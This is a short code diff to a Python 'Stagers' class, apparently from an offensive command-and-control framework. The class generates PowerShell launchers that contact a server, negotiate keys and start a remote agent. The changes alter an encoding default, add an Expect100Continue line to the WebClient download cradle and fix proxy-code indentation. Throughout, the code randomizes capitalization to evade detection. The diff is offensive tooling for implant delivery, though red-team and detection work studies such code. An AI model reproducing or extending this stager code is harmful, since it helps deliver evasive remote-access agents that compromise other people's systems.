@@ -124,7 +124,7 @@ class Stagers:
             return randomizedStager
 
 
-    def generate_stager_hop(self, server, key, encrypt=True, encode=True):
+    def generate_stager_hop(self, server, key, encrypt=True, encode=False):
         """
         Generate the PowerShell stager for hop.php redirectors that 
         will perform key negotiation with the server and kick off the agent.
@@ -309,7 +309,8 @@ class Stagers:
         # get the launching URI
         URI = self.generate_launcher_uri(server, encode, pivotServer, hop)
 
-        stager = helpers.randomize_capitalization("$wc=New-Object System.Net.WebClient;")
+        stager = helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue = 0;")
+        stager += helpers.randomize_capitalization("$wc=New-Object System.Net.WebClient;")
         stager += "$u='"+userAgent+"';"
 
         if "https" in URI:
@@ -327,7 +328,7 @@ class Stagers:
                     stager += helpers.randomize_capitalization("$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;")
                 else:
                     # TODO: implement form for other proxy
-		    stager += helpers.randomize_capitalization("$proxy = new-object net.WebProxy;")
+                    stager += helpers.randomize_capitalization("$proxy = new-object net.WebProxy;")
                     stager += helpers.randomize_capitalization("$proxy.Address = '"+ proxy.lower() +"';")
                     stager += helpers.randomize_capitalization("$wc.Proxy = $proxy;")
                 if proxyCreds.lower() == "default":
